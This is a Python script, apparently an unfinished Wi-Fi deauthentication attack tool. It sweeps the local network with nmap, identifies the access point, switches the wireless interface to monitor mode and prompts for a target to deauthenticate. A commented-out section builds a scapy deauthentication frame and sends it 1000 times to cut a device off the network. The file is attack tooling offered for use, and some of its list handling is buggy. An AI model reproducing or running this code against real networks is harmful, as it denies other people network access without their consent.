import nmap
from scapy.all import *
import StringIO
import subprocess

def get_network_id():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            network_id_raw = ap_ip.split('.')
            network_id = network_id_raw[0] + '.' + network_id_raw[1] + '.' + network_id_raw[2] + '.0/24'
    return network_id
##
# Scans dictionary result from nm.scan() and returns list of parsed elements
# PARAMS -- dictionary
# RETURNS -- list
##
def get_raw_results(nm_scan):
    raw_results = []
    for key, value in nm_scan['scan'].iteritems():

        r = [value['hostname'], value['addresses']['ipv4']]
        if 'mac' in value['addresses']:
            r.append(value['addresses']['mac'])
        else:
            r.append('--:--:--:--:--:--')
        raw_results.append(r)
    return raw_results

def print_results(results):
    print('ID'+'\t'+'MAC'+'\t\t\t'+'IPv4'+'\t\t\t'+'HOST')
    for i in range(0, len(results)):
        print(str(i) + '\t' + results[i][2] + '\t' + results[i][1] + '\t\t' + results[i][0])




def ask_user():
    user_choice = input('Who you would like to deauthenticate? ')
    return user_choice

def get_ap_ip_local_ip_iface():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            local_ip = split_line[4]
            iface = split_line[3]
            return ap_ip, local_ip, iface


def get_ap_mac_from_raw(raw_results, ap_ip):
    for single_array in raw_results:
        if single_array[1] == ap_ip:
            ap_mac = single_array[2]
            return ap_mac

def get_refined_results(raw_results, ap_ip, local_ip):
    for i in range(0, len(raw_results)):
        if raw_results[i][1] == ap_ip:
            del raw_results[i]
    count = 0
    for i in raw_results:
        if i[1] == local_ip:
            del raw_results[count]
        count += 1

    refined_results = raw_results
    return refined_results

def enable_monitor_mode(iface):
    subprocess.call('ifconfig ' + iface + ' down', shell=True)
    subprocess.call('iwconfig ' + iface + ' mode Monitor', shell=True)
    subprocess.call('ifconfig ' + iface + ' up', shell=True)



print(conf.route)
network_id = get_network_id()
nm = nmap.PortScanner()
nm_scan = nm.scan(hosts = network_id, arguments='-sP')



raw_results = get_raw_results(nm_scan)

ap_ip, local_ip, iface = get_ap_ip_local_ip_iface()

ap_mac = get_ap_mac_from_raw(raw_results, ap_ip)

refined_results = get_refined_results(raw_results, ap_ip, local_ip)

enable_monitor_mode(iface)

print_results(refined_results)

user_choice = ask_user()

# print(nm_scan['scan']['192.168.254.2']['hostname'])
# mac_addresses = get_mac_addresses(nm_scan)

# packet = RadioTap()/Dot11(type=0,subtype=12,addr1='XX:XX:XX:XX:XX:XX',addr2='XX:XX:XX:XX:XX:XX',addr3='XX:XX:XX:XX:XX:XX')/Dot11Deauth(reason=7)
# for n in range(1000):
#     sendp(packet)
#
# print conf.iface

# print(a['scan'][u'192.168.254.254']['addresses'][u'mac'])
# print('')


# for k,v in a['scan'].iteritems():
#     if str(v['status']['state']) == 'up':
#         number_thread += 1
#         print str(v)
#         try:
#             print str(v['addresses']['ipv4']) + ' => ' + str(v['addresses']['mac'])
#         except:
#             print str(v['addresses']['ipv4'])
